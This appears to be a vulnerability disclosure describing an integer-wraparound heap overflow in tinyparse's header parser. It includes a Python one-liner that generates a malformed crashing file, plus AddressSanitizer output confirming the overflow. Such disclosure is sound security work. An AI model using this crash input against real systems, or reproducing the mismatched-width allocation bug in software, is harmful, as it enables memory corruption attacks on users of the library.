# A brand new, never reported memory corruption in tinyparse header parsing

I found a completely novel vulnerability in tinyparse 2.3.1 that nobody has reported before.

## What happens

In `src/header.c`, `parse_header()` reads a two byte declared length from the file. It adds the 24 byte header prefix
to that value in a variable declared as `uint16_t` and passes the result to `malloc`. A declared length of `0xFFF8`
makes the sum wrap around to `0x0010`, so only 16 bytes are allocated. The function then copies the real number of
bytes, computed again in a `size_t`, into that small block.

## Reproduction

```sh
python3 -c "
import struct, sys
sys.stdout.buffer.write(b'TP' + struct.pack('<H', 0xFFF8) + b'B' * 80000)
" > crash.bin
ASAN_OPTIONS=halt_on_error=1 ./demo crash.bin
```

```
==777==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 65528 at 0x60200000eff0
    #1 parse_header src/header.c:73
```

## Why it happens

The allocation size and the copy size come from two different integer widths. The 16 bit one wraps and the 64 bit one
does not, so the copy is far larger than the buffer.

## Severity

This is an attacker controlled heap write, so it is critical.
